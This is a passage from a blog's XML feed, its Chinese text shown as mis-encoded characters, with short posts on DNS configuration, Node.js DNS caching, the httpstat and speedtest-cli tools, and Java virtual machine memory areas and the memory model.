114.114.114.114 #ä¿®æ”¹æˆä½ çš„ä¸»DNS</span><br><span class="line">nameserver 114.114.115.115 #ä¿®æ”¹æˆä½ çš„å¤‡ç”¨DNS</span><br><span class="line">search localhost #ä½ çš„åŸŸå</span><br></pre></td></tr></table></figure><p>è¾“å…¥<code>:wq</code>ä¿å­˜é€€å‡º</p><h3 id="æ°¸ä¹…ä¿®æ”¹ç½‘å¡"><a href="#æ°¸ä¹…ä¿®æ”¹ç½‘å¡" class="headerlink" title="æ°¸ä¹…ä¿®æ”¹ç½‘å¡"></a>æ°¸ä¹…ä¿®æ”¹ç½‘å¡</h3><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nodejs-dns-cache</title>
      <link href="/post/nodejs-dns-cache.html"/>
      <url>/post/nodejs-dns-cache.html</url>
      
        <content type="html"><![CDATA[<h3 id="Node-js-DNSç¼“å­˜"><a href="#Node-js-DNSç¼“å­˜" class="headerlink" title="Node.js DNSç¼“å­˜"></a>Node.js DNSç¼“å­˜</h3><p>Node.jsé»˜è®¤ä¸ä¼šç¼“å­˜DNSä¿¡æ¯ï¼Œå¦‚æœéœ€è¦å‘å¤§é‡è¯·æ±‚æ—¶ï¼Œä½¿ç”¨å¸¦ç¼“å­˜çš„<code>dns.lookup</code>å¯ä»¥æé«˜æ€§èƒ½ã€‚  </p><p><em>lookupåªæ”¯æŒhttpï¼Œhttpsä¸ä¼šç”Ÿæ•ˆ</em></p><p><img src="/images/QQ20170118-0@2x.jpg"></p><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><h4 id="ä½¿ç”¨httpæ¨¡å—"><a href="#ä½¿ç”¨httpæ¨¡å—" class="headerlink" title="ä½¿ç”¨httpæ¨¡å—"></a>ä½¿ç”¨httpæ¨¡å—</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> dns = <span class="built_in">require</span>(<span class="string">&#x27;dnscache&#x27;</span>)(&#123;</span><br><span class="line">    <span class="attr">enable</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">ttl</span>: <span class="number">300</span>,</span><br><span class="line">    <span class="attr">cachesize</span>: <span class="number">1000</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> options = &#123;</span><br><span class="line">    <span class="attr">hostname</span>: <span class="string">&#x27;www.baidu.com&#x27;</span>,</span><br><span class="line">    <span class="attr">port</span>: <span class="number">80</span>,</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/fe0a164b-06f9-4d27-a689-c554e69a9d82.jpg&#x27;</span>,</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="attr">lookup</span>: dns.<span class="property">lookup</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> req = http.<span class="title function_">request</span>(options, <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`STATUS: <span class="subst">$&#123;res.statusCode&#125;</span>`</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`HEADERS: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(res.headers)&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// res.setEncoding(&#x27;utf8&#x27;);</span></span><br><span class="line">    res.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// console.log(`BODY: $&#123;chunk&#125;`);</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;No more data in response.&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">req.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`problem with request: <span class="subst">$&#123;e.message&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// write data to request body</span></span><br><span class="line">req.<span class="title function_">end</span>();</span><br></pre></td></tr></table></figure><h4 id="ä½¿ç”¨requestæ¨¡å—"><a href="#ä½¿ç”¨requestæ¨¡å—" class="headerlink" title="ä½¿ç”¨requestæ¨¡å—"></a>ä½¿ç”¨requestæ¨¡å—</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> request = <span class="built_in">require</span>(<span class="string">&#x27;request&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> dns = <span class="built_in">require</span>(<span class="string">&#x27;dnscache&#x27;</span>)(&#123;</span><br><span class="line">    <span class="attr">enable</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">ttl</span>: <span class="number">300</span>,</span><br><span class="line">    <span class="attr">cachesize</span>: <span class="number">1000</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">request = request.<span class="title function_">defaults</span>(&#123;</span><br><span class="line">    <span class="attr">lookup</span>: dns.<span class="property">lookup</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">request.<span class="title function_">get</span>(<span class="string">&#x27;http://www.baidu.com/fe0a164b-06f9-4d27-a689-c554e69a9d82.jpg&#x27;</span>, <span class="keyword">function</span> (<span class="params">error, response, body</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (error) <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;request failed:&#x27;</span>, error);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`STATUS: <span class="subst">$&#123;response.statusCode&#125;</span>`</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`HEADERS: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(response.headers)&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://nodejs.org/api/net.html#net_socket_connect_options_connectlistener">ã€1ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>httpstat</title>
      <link href="/post/httpstat.html"/>
      <url>/post/httpstat.html</url>
      
        <content type="html"><![CDATA[<h3 id="httpstat-HTTP-å“åº”çš„å¯è§†åŒ–å‘½ä»¤è¡Œå·¥å…·"><a href="#httpstat-HTTP-å“åº”çš„å¯è§†åŒ–å‘½ä»¤è¡Œå·¥å…·" class="headerlink" title="httpstat - HTTP å“åº”çš„å¯è§†åŒ–å‘½ä»¤è¡Œå·¥å…·"></a>httpstat - HTTP å“åº”çš„å¯è§†åŒ–å‘½ä»¤è¡Œå·¥å…·</h3><p><img src="/images/QQ20170117-0@2x.jpg"></p><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install httpstat</span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpstat http://www.baidu.com</span><br></pre></td></tr></table></figure><p>æ•´å€‹ç¶²è·¯é€£ç·šæ‰€è€—è²»çš„æ™‚é–“åˆ†ç‚ºå››æ®µï¼š</p><p>DNS Lookupï¼šDNS åç¨±è§£ææ‰€è€—è²»çš„æ™‚é–“ã€‚<br>TCP Connectionï¼šå¯¦éš›èˆ‡ç¶²é ä¼ºæœå™¨å»ºç«‹ TCP é€£ç·šæ‰€è€—è²»çš„æ™‚é–“ã€‚<br>Server Processingï¼šç¶²é ä¼ºæœå™¨åœ¨è™•ç†ç¶²é è«‹æ±‚æ‰€è€—è²»çš„æ™‚é–“ã€‚<br>Content Transferï¼šå‚³é€ç¶²é å…§å®¹è‡³ç€è¦½å™¨æ‰€è€—è²»çš„æ™‚é–“ã€‚<br>å¾é€™å€‹å ±è¡¨æˆ‘å€‘å°±å¯ä»¥å¤§ç´„çœ‹å‡ºç¶²ç«™ç›®å‰çš„é‹è¡Œæƒ…æ³æ˜¯å¦æ­£å¸¸ã€‚   </p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://gold.xitu.io/entry/57c7a11d0e3dd9006a28a7ca">ã€1ã€‘</a> <a href="https://blog.gtwang.org/linux/httpstat-curl-statistics-tool-to-check-website-performance/">ã€2ã€‘</a> <a href="https://linux.cn/article-8039-1.html">ã€3ã€‘</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é€Ÿæµ‹è¯•</title>
      <link href="/post/speedtest.html"/>
      <url>/post/speedtest.html</url>
      
        <content type="html"><![CDATA[<h3 id="Speedtest"><a href="#Speedtest" class="headerlink" title="Speedtest"></a>Speedtest</h3><p>Speedtest.netå¼ºå¤§è€ŒçŸ¥åçš„å…¨çƒå®½å¸¦ç½‘ç»œé€Ÿåº¦æµ‹è¯•ç½‘ç«™ï¼Œé‡‡ç”¨Flashè½½å…¥ç•Œé¢ï¼ŒAlexaä¸–ç•Œæ’åéå¸¸é«˜ã€‚Speedtest.netåœ¨å…¨çƒæœ‰æ•°ç™¾ä¸ªæµ‹è¯•èŠ‚ç‚¹ï¼Œå›½å†…æœ‰æµ‹é€ŸèŠ‚ç‚¹å‡ åä¸ªã€‚ä½œä¸ºä¸€æ¬¾åœ¨çº¿å¹¶ä¸”å¯è§†åŒ–çš„ç½‘é€Ÿæµ‹è¯•å·¥å…·ã€‚ä½¿ç”¨æ–¹æ³•ç®€å•ï¼Œæ— éœ€ä¸‹è½½ã€å®‰è£…å¤šä½™è½¯ä»¶ï¼Œåªéœ€æœ‰æµè§ˆå™¨å³å¯ã€‚   </p><p>Speedtest.netè¿˜æ¨å‡ºäº†å‘½ä»¤è¡Œä¸‹æµ‹é€Ÿå·¥å…·speedtest-cliã€‚</p><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install speedtest-cli</span><br></pre></td></tr></table></figure><p>å®‰è£…å®Œæˆåï¼Œç›´æ¥åœ¨å‘½ä»¤è¡Œè¾“å…¥å‘½ä»¤å³å¯æµ‹è¯•ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">speedtest-cli</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.geekfan.net/5521/">ã€1ã€‘</a> <a href="https://github.com/sivel/speedtest-cli">ã€2ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaè™šæ‹Ÿæœº</title>
      <link href="/post/jvm.html"/>
      <url>/post/jvm.html</url>
      
        <content type="html"><![CDATA[<h2 id="Javaè™šæ‹Ÿæœº"><a href="#Javaè™šæ‹Ÿæœº" class="headerlink" title="Javaè™šæ‹Ÿæœº"></a>Javaè™šæ‹Ÿæœº</h2><h3 id="Javaå†…å­˜åŒºåŸŸ"><a href="#Javaå†…å­˜åŒºåŸŸ" class="headerlink" title="Javaå†…å­˜åŒºåŸŸ"></a>Javaå†…å­˜åŒºåŸŸ</h3><ul><li><p>ç¨‹åºè®¡æ•°å™¨</p><p>  ç¨‹åºè®¡æ•°å™¨ï¼ˆProgram Counter Registerï¼‰æ˜¯ä¸€å—è¾ƒå°çš„å†…å­˜ç©ºé—´ï¼Œå®ƒå¯ä»¥çœ‹ä½œæ˜¯å½“å‰çº¿ç¨‹æ‰€æ‰§è¡Œçš„å­—èŠ‚ç çš„è¡Œå·æŒ‡ç¤ºå™¨ã€‚åœ¨è™šæ‹Ÿæœºçš„æ¦‚å¿µæ¨¡å‹é‡Œï¼ˆä»…æ˜¯æ¦‚å¿µæ¨¡å‹ï¼Œå„ç§è™šæ‹Ÿæœºå¯èƒ½ä¼šé€šè¿‡ä¸€äº›æ›´é«˜æ•ˆçš„æ–¹å¼å»å®ç°ï¼‰ï¼Œå­—èŠ‚ç è§£é‡Šå™¨å·¥ä½œæ—¶å°±æ˜¯é€šè¿‡æ”¹å˜è¿™ä¸ªè®¡æ•°å™¨çš„å€¼æ¥é€‰å–ä¸‹ä¸€æ¡éœ€è¦æ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤ï¼Œåˆ†æ”¯ã€å¾ªç¯ã€è·³è½¬ã€å¼‚å¸¸å¤„ç†ã€çº¿ç¨‹æ¢å¤ç­‰åŸºç¡€åŠŸèƒ½éƒ½éœ€è¦ä¾èµ–è¿™ä¸ªè®¡æ•°å™¨æ¥å®Œæˆã€‚</p></li><li><p>Javaè™šæ‹Ÿæœºæ ˆ</p><p>  ä¸ç¨‹åºè®¡æ•°å™¨ä¸€æ ·ï¼ŒJavaè™šæ‹Ÿæœºæ ˆï¼ˆJava Virtual Machine Stacksï¼‰ä¹Ÿæ˜¯çº¿ç¨‹ç§æœ‰çš„ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸä¸çº¿ç¨‹ç›¸åŒã€‚è™šæ‹Ÿæœºæ ˆæè¿°çš„æ˜¯Javaæ–¹æ³•æ‰§è¡Œçš„å†…å­˜æ¨¡å‹ï¼šæ¯ä¸ªæ–¹æ³•åœ¨æ‰§è¡Œçš„åŒæ—¶éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ ˆå¸§ï¼ˆStack Frame[1]ï¼‰ç”¨äºå­˜å‚¨<strong>å±€éƒ¨å˜é‡è¡¨</strong>ã€æ“ä½œæ•°æ ˆã€åŠ¨æ€é“¾æ¥ã€æ–¹æ³•å‡ºå£ç­‰ä¿¡æ¯ã€‚æ¯ä¸€ä¸ªæ–¹æ³•ä»è°ƒç”¨ç›´è‡³æ‰§è¡Œå®Œæˆçš„è¿‡ç¨‹ï¼Œå°±å¯¹åº”ç€ä¸€ä¸ªæ ˆå¸§åœ¨è™šæ‹Ÿæœºæ ˆä¸­å…¥æ ˆåˆ°å‡ºæ ˆçš„è¿‡ç¨‹ã€‚</p><p>  å¦‚æœçº¿ç¨‹è¯·æ±‚çš„æ ˆæ·±åº¦å¤§äºè™šæ‹Ÿæœºæ‰€å…è®¸çš„æ·±åº¦ï¼Œå°†æŠ›å‡º<code>StackOverflowError</code>å¼‚å¸¸ï¼Œè¿™ä¸ªåœ¨é€’å½’æ—¶å¯èƒ½ä¼šå‘ç”Ÿã€‚å¦‚æœæ ˆç©ºé—´æ”¯æŒåŠ¨æ€æ‰©å±•ï¼Œå½“æ— æ³•ç”³è¯·åˆ°è¶³å¤Ÿå†…å­˜æ˜¯ä¹Ÿä¼šæŠ›å‡º<code>OutOfMemoryError</code>å¼‚å¸¸ã€‚</p><p>  ä½¿ç”¨è®¾ç½®<code>-Xss</code>å¯ä»¥è®¾ç½®æ ˆå¤§å°ã€‚è™šæ‹Ÿæœºæ ˆæ˜¯çº¿ç¨‹ç‹¬æœ‰çš„ï¼Œæ¯ä¸ªçº¿ç¨‹åˆ†é…åˆ°çš„æ ˆå®¹é‡è¶Šå¤§ï¼Œå¯ä»¥å»ºç«‹çš„çº¿ç¨‹æ•°é‡è‡ªç„¶å°±è¶Šå°‘ï¼Œå»ºç«‹çº¿ç¨‹æ—¶å°±è¶Šå®¹æ˜“æŠŠå‰©ä¸‹çš„å†…å­˜è€—å°½ã€‚</p></li><li><p>æœ¬åœ°æ–¹æ³•æ ˆ</p><p>  æœ¬åœ°æ–¹æ³•æ ˆä¸è™šæ‹Ÿæœºæ ˆç±»ä¼¼ï¼Œåªæ˜¯è¿™é‡Œè™šæ‹Ÿæœºä½¿ç”¨åˆ°çš„Nativeæ–¹æ³•æœåŠ¡ã€‚è¿™é‡ŒåŒæ ·å¯èƒ½ä¼šæŠ›å‡º<code>StackOverflowError</code>å’Œ<code>OutOfMemoryError</code>å¼‚å¸¸ã€‚</p></li><li><p>Javaå †</p><p>  Javaå †æ˜¯Javaé‡Œé¢æœ€å¤§çš„ä¸€å—å†…å­˜ã€‚Javaå †æ˜¯è¢«æ‰€æœ‰çº¿ç¨‹å…±äº«çš„ä¸€å—å†…å­˜åŒºåŸŸï¼Œåœ¨è™šæ‹Ÿæœºå¯åŠ¨æ—¶åˆ›å»ºã€‚æ­¤å†…å­˜åŒºåŸŸçš„å”¯ä¸€ç›®çš„å°±æ˜¯å­˜æ”¾å¯¹è±¡å®ä¾‹ã€‚åƒåœ¾å›æ”¶ä¹Ÿä¸»è¦åœ¨å †å»è¿›è¡Œã€‚</p><p>  ä½¿ç”¨<code>-Xms</code>å’Œ<code>-Xmx</code>æ¥è®¾ç½®å †çš„åˆå§‹å’Œæœ€å¤§å¤§å°ï¼Œå¾ˆå¤šè½¯ä»¶éƒ½å»ºè®®å°†ä¸¤è€…è®¾ç½®çš„ä¸€æ ·å¤§ã€‚</p><p>  å¦‚æœç”³è¯·ä¸åˆ°è¶³å¤Ÿçš„å†…å­˜è¿™é‡Œä¼šæŠ›å‡º<code>OutOfMemoryError</code>å¼‚å¸¸ï¼Œåé¢ä¼šè·Ÿç€è¿›ä¸€æ­¥æç¤ºâ€Java heap spaceâ€ã€‚</p><p>  <code>TLAB</code>å…¨ç§°ThreadLocalAllocBufferï¼Œæ˜¯çº¿ç¨‹çš„ä¸€å—ç§æœ‰å†…å­˜ã€‚å¦‚æœè®¾ç½®äº†è™šæ‹Ÿæœºå‚æ•° -XX:UseTLABï¼Œåœ¨çº¿ç¨‹åˆå§‹åŒ–æ—¶ï¼ŒåŒæ—¶ä¹Ÿä¼šç”³è¯·ä¸€å—æŒ‡å®šå¤§å°çš„å†…å­˜ï¼Œåªç»™å½“å‰çº¿ç¨‹ä½¿ç”¨ï¼Œè¿™æ ·æ¯ä¸ªçº¿ç¨‹éƒ½å•ç‹¬æ‹¥æœ‰ä¸€ä¸ªBufferã€‚å¦‚æœéœ€è¦åˆ†é…å†…å­˜ï¼Œå°±åœ¨è‡ªå·±çš„Bufferä¸Šåˆ†é…ï¼Œè¿™æ ·å°±ä¸å­˜åœ¨ç«äº‰çš„æƒ…å†µï¼Œ<strong>å¯ä»¥å¤§å¤§æå‡åˆ†é…æ•ˆç‡</strong>ï¼ˆå‡æ‘Šå¯¹GCå †ï¼ˆedenåŒºï¼‰é‡Œå…±äº«çš„åˆ†é…æŒ‡é’ˆåšæ›´æ–°è€Œå¸¦æ¥çš„åŒæ­¥å¼€é”€ã€‚ï¼‰ï¼Œå½“Bufferå®¹é‡ä¸å¤Ÿçš„æ—¶å€™ï¼Œå†é‡æ–°ä»EdenåŒºåŸŸç”³è¯·ä¸€å—ç»§ç»­ä½¿ç”¨ï¼Œè¿™ä¸ªç”³è¯·åŠ¨ä½œè¿˜æ˜¯éœ€è¦åŸå­æ“ä½œçš„ã€‚TLABåªæ˜¯è®©æ¯ä¸ªçº¿ç¨‹æœ‰ç§æœ‰çš„åˆ†é…æŒ‡é’ˆï¼Œä½†åº•ä¸‹å­˜å¯¹è±¡çš„å†…å­˜ç©ºé—´è¿˜æ˜¯ç»™æ‰€æœ‰çº¿ç¨‹è®¿é—®çš„ï¼Œåªæ˜¯å…¶å®ƒçº¿ç¨‹æ— æ³•åœ¨è¿™ä¸ªåŒºåŸŸåˆ†é…è€Œå·²ã€‚å¯ä»¥é€šè¿‡<code>-XX:+/-UseTLAB</code>å‚æ•°æ¥è®¾å®šã€‚</p></li><li><p>æ–¹æ³•åŒº</p><p>  è¿™é‡Œä¸»è¦<strong>ç±»ä¿¡æ¯</strong>ã€<em>å¸¸é‡</em>ï¼ˆä¸åŒç‰ˆæœ¬çš„è™šæ‹Ÿæœºå¸¸é‡å­˜å‚¨åœ°æ–¹å¯èƒ½ä¸åŒï¼‰ã€é™æ€å˜é‡ã€å³æ—¶ç¼–è¯‘å™¨ç¼–è¯‘åçš„ä»£ç ç­‰æ•°æ®ã€‚</p><p>  è¿è¡Œæ—¶å¸¸é‡æ± ï¼ˆRuntime Constant Poolï¼‰æ˜¯æ–¹æ³•åŒºçš„ä¸€éƒ¨åˆ†ã€‚Classæ–‡ä»¶ä¸­é™¤äº†æœ‰ç±»çš„ç‰ˆæœ¬ã€å­—æ®µã€æ–¹æ³•ã€æ¥å£ç­‰æè¿°ä¿¡æ¯å¤–ï¼Œè¿˜æœ‰ä¸€é¡¹ä¿¡æ¯æ˜¯å¸¸é‡æ± ï¼ˆConstant Pool Tableï¼‰ï¼Œç”¨äºå­˜æ”¾ç¼–è¯‘æœŸç”Ÿæˆçš„å„ç§å­—é¢é‡å’Œç¬¦å·å¼•ç”¨ï¼Œè¿™éƒ¨åˆ†å†…å®¹å°†åœ¨ç±»åŠ è½½åè¿›å…¥æ–¹æ³•åŒºçš„è¿è¡Œæ—¶å¸¸é‡æ± ä¸­å­˜æ”¾ã€‚</p><p>  å¯¹äºéœ€è¦å¤§é‡åŠ¨æ€ç”Ÿæˆç±»çš„æ¡†æ¶ï¼ˆSpringï¼‰è¿™é‡Œå¯èƒ½ä¼šå‘ç”Ÿå†…å­˜æº¢å‡ºï¼Œåé¢ä¼šæç¤ºâ€PermGen spaceâ€ã€‚</p><p>  ä½¿ç”¨<code>-XX:PermSize</code>è®¾ç½®åˆå§‹å¤§å°ï¼Œ<code>-XX:MaxPermSize</code>è®¾ç½®æ–¹æ³•åŒºå†…å­˜ä¸Šé™ã€‚</p><blockquote><p>ä»Java8å¼€å§‹ä½¿ç”¨<code>-XX:MetaspaceSize</code>å’Œ<code>-XX:MaxMetaspaceSize</code>è®¾ç½®ã€‚</p></blockquote></li><li><p>ç›´æ¥å†…å­˜</p><p>  ç›´æ¥å†…å­˜ï¼ˆDirect Memoryï¼‰å¹¶ä¸æ˜¯è™šæ‹Ÿæœºè¿è¡Œæ—¶æ•°æ®åŒºçš„ä¸€éƒ¨åˆ†ã€‚ä»Java1.4 NIOå¼€å§‹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨å †å¤–å†…å­˜ã€‚<code>DirectByteBuffer</code>å¯¹è±¡ä½œä¸ºå¯¹è¿™éƒ¨åˆ†å†…å­˜çš„å¼•ç”¨è¿›è¡Œæ“ä½œã€‚è¿™æ ·èƒ½åœ¨ä¸€äº›åœºæ™¯ä¸­æ˜¾è‘—æé«˜æ€§èƒ½ï¼Œå› ä¸ºé¿å…äº†åœ¨Javaå †å’ŒNativeå †ä¸­æ¥å›å¤åˆ¶æ•°æ®ã€‚</p><p>  å †å†…å­˜ä¸å—Javaè™šæ‹Ÿæœºå †å†…å­˜é™åˆ¶ï¼Œä½†æ˜¯å®ƒä¼šå—åˆ°æœ¬æœºæ€»å†…å­˜é™åˆ¶ã€‚å½“å†…å­˜ä¸è¶³æ˜¯ä¼šå‘ç”Ÿ<code>OutOfMemoryError</code>å¼‚å¸¸ã€‚</p><p>  ä½¿ç”¨<code>-XX:MaxDirectMemorySize</code>è®¾ç½®ï¼Œå¦‚æœä¸æŒ‡å®šé»˜è®¤å’Œ<code>-Xmx</code>ä¸€æ ·å¤§ã€‚</p></li></ul><h3 id="Javaå†…å­˜æ¨¡å‹"><a href="#Javaå†…å­˜æ¨¡å‹" class="headerlink" title="Javaå†…å­˜æ¨¡å‹"></a>Javaå†…å­˜æ¨¡å‹</h3><p>Javaè™šæ‹Ÿæœºè§„èŒƒä¸­è¯•å›¾å®šä¹‰ä¸€ç§Javaå†…å­˜æ¨¡å‹ï¼ˆJava Memory Model,JMMï¼‰æ¥å±è”½æ‰å„ç§ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿçš„å†…å­˜è®¿é—®å·®å¼‚ï¼Œä»¥å®ç°è®©Javaç¨‹åºåœ¨å„ç§å¹³å°ä¸‹éƒ½èƒ½è¾¾åˆ°ä¸€è‡´çš„å†…å­˜è®¿é—®æ•ˆæœã€‚ä¸»æµç¨‹åºè¯­è¨€ï¼ˆå¦‚C&#x2F;C++ç­‰ï¼‰ç›´æ¥ä½¿ç”¨ç‰©ç†ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿçš„å†…å­˜æ¨¡å‹ï¼Œå› æ­¤ï¼Œä¼šç”±äºä¸åŒå¹³å°ä¸Šå†…å­˜æ¨¡å‹çš„å·®å¼‚ï¼Œæœ‰å¯èƒ½å¯¼è‡´ç¨‹åºåœ¨ä¸€å¥—å¹³å°ä¸Šå¹¶å‘å®Œå…¨æ­£å¸¸ï¼Œè€Œåœ¨å¦å¤–ä¸€å¥—å¹³å°ä¸Šå¹¶å‘è®¿é—®å´ç»å¸¸å‡ºé”™ï¼Œå› æ­¤åœ¨æŸäº›åœºæ™¯å°±å¿…é¡»é’ˆå¯¹ä¸åŒçš„å¹³å°æ¥ç¼–å†™ç¨‹åºã€‚</p><p>Javaå†…å­˜æ¨¡å‹çš„ä¸»è¦ç›®æ ‡æ˜¯å®šä¹‰ç¨‹åºä¸­å„ä¸ªå˜é‡çš„è®¿é—®è§„åˆ™ï¼Œå³åœ¨è™šæ‹Ÿæœºä¸­å°†å˜é‡å­˜å‚¨åˆ°å†…å­˜å’Œä»å†…å­˜ä¸­å–å‡ºå˜é‡è¿™æ ·çš„åº•å±‚ç»†èŠ‚ã€‚</p><p>Javaå†…å­˜æ¨¡å‹è§„å®šäº†æ‰€æœ‰çš„å˜é‡éƒ½å­˜å‚¨åœ¨ä¸»å†…å­˜ï¼ˆMain Memoryï¼‰ä¸­ã€‚æ¯æ¡çº¿ç¨‹è¿˜æœ‰è‡ªå·±çš„å·¥ä½œå†…å­˜ï¼ˆWorking Memoryï¼‰ï¼Œçº¿ç¨‹çš„å·¥ä½œå†…å­˜ä¸­ä¿å­˜äº†è¢«è¯¥çº¿ç¨‹ä½¿ç”¨åˆ°çš„å˜é‡çš„ä¸»å†…å­˜å‰¯æœ¬æ‹·è´ï¼Œçº¿ç¨‹å¯¹å˜é‡çš„æ‰€æœ‰æ“ä½œï¼ˆè¯»å–ã€èµ‹å€¼ç­‰ï¼‰éƒ½å¿…é¡»åœ¨å·¥ä½œå†…å­˜ä¸­è¿›è¡Œï¼Œè€Œä¸èƒ½ç›´æ¥è¯»å†™ä¸»å†…å­˜ä¸­çš„å˜é‡ã€‚ä¸åŒçš„çº¿ç¨‹ä¹‹é—´ä¹Ÿæ— æ³•ç›´æ¥è®¿é—®å¯¹æ–¹å·¥ä½œå†…å­˜ä¸­çš„å˜é‡ï¼Œçº¿ç¨‹é—´å˜é‡å€¼çš„ä¼ é€’å‡éœ€è¦é€šè¿‡ä¸»å†…å­˜æ¥å®Œæˆã€‚</p><blockquote><p>Javaå†…å­˜æ¨¡å‹å’Œä¸Šé¢çš„Javaå†…å­˜åŒºåŸŸä¸æ˜¯ä¸€ä¸ªçº§åˆ«çš„æ¦‚å¿µã€‚</p></blockquote><p><img src="/images/java-memory-model.png"></p><ul><li><p>å¯è§æ€§</p><p>  ç”±äºæ¯æ¡çº¿ç¨‹åªèƒ½ç›´æ¥è¯»å–ã€ä¿®æ”¹å·¥ä½œå†…å­˜ï¼Œå·¥ä½œå†…å­˜å’Œä¸»å­˜æ•°æ®æœºä¼šå­˜åœ¨ä¸ä¸€è‡´çš„æƒ…å†µã€‚</p></li><li><p>æŒ‡ä»¤é‡æ’</p><p>  